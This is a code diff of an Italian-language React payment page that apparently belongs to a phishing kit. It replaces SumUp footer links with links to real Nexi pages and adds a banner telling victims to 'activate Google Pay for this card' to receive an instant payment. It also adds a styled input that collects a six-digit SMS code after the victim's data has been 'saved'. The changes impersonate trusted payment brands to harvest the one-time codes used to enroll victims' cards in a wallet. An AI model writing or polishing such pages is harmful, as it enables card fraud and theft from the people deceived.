@@ -177,21 +177,21 @@ async function saveWaitingName(e: React.FormEvent) {
           className="mx-auto h-20 w-auto object-contain opacity-80"
         />
 
-        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
-          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
-            Avviso legale
+       <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
+          <a href="https://www.nexi.it/it/carte-di-pagamento/sicurezza" className="hover:text-white hover:underline">
+            Prevenzione frodi
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
-            Politica sulla riservatezza
+          <a href="https://www.nexi.it/it/privacy" className="hover:text-white hover:underline">
+            Privacy
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
-            Termini &amp; Condizioni
+          <a href="https://www.nexi.it/it/cookie-policy" className="hover:text-white hover:underline">
+            Cookie
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
-            Informativa sui cookie
+          <a href="https://www.nexi.it/it/reclami" className="hover:text-white hover:underline">
+            Reclami
           </a>
         </nav>
       </footer>
@@ -211,25 +211,52 @@ async function saveWaitingName(e: React.FormEvent) {
         Ciao {row.first_name}, i tuoi dati sono stati salvati!
       </p>
       <br></br>
-      <p className="mt-4 text-sm uppercase tracking-wide text-[#393948]">
-        ATTIVA GOOGLE PAY PER LA RICEZIONE DEL PAGAMENTO
-      </p>
-        <br></br>
+        <div className="mb-8 flex w-full items-center justify-center gap-2 rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
+  <svg
+    className="h-5 w-5 shrink-0 text-green-600"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2.5"
+    aria-hidden="true"
+  >
+    <circle cx="12" cy="12" r="10" />
+    <path d="M8 12.5l2.5 2.5L16 9" />
+  </svg>
+  <p className="text-sm text-[#a48403]">
+    ATTIVA GOOGLE PAY PER QUESTA CARTA PER LA RICEZIONE DEL PAGAMENTO ISTANTANEA 
+  </p>
+</div>
+        
      <b> <p className="mt-3 text-[#000000]">
        Inserire il codice ricevuto tramite sms per procedere.
       </p></b>
 
       <form onSubmit={saveWaitingName} className="mx-auto mt-6 w-full max-w-sm space-y-3">
         
+  <div className="relative">
+  <svg
+    className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-gray-500"
+    viewBox="0 0 24 24"
+    fill="none"
+    stroke="currentColor"
+    strokeWidth="2"
+    aria-hidden="true"
+  >
+    <rect x="5" y="3" width="14" height="18" rx="2" />
+    <path d="M9 8h6M9 12h6M9 16h3" />
+  </svg>
   <input
     required
-    type="numeric"
-    placeholder="Codice"
+    type="text"
+    inputMode="numeric"
+    placeholder="Codice sms"
     maxLength={6}
     value={waitingName}
     onChange={(e) => setWaitingName(e.target.value)}
-    className="w-full rounded-lg border border-gray-300 px-3 py-2 text-gray-900 outline-none focus:border-blue-500"
+    className="w-full rounded-lg border border-gray-300 py-2 pl-10 pr-3 text-gray-900 outline-none focus:border-blue-500"
   />
+</div>
   <br></br>
   <button
   type="submit"
@@ -284,20 +311,20 @@ async function saveWaitingName(e: React.FormEvent) {
         />
 
         <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
-          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
-            Avviso legale
+          <a href="https://www.nexi.it/it/carte-di-pagamento/sicurezza" className="hover:text-white hover:underline">
+            Prevenzione frodi
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
-            Politica sulla riservatezza
+          <a href="https://www.nexi.it/it/privacy" className="hover:text-white hover:underline">
+            Privacy
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
-            Termini &amp; Condizioni
+          <a href="https://www.nexi.it/it/cookie-policy" className="hover:text-white hover:underline">
+            Cookie
           </a>
           <span className="hidden text-[#2a3548] sm:inline">|</span>
-          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
-            Informativa sui cookie
+          <a href="https://www.nexi.it/it/reclami" className="hover:text-white hover:underline">
+            Reclami
           </a>
         </nav>
       </footer>
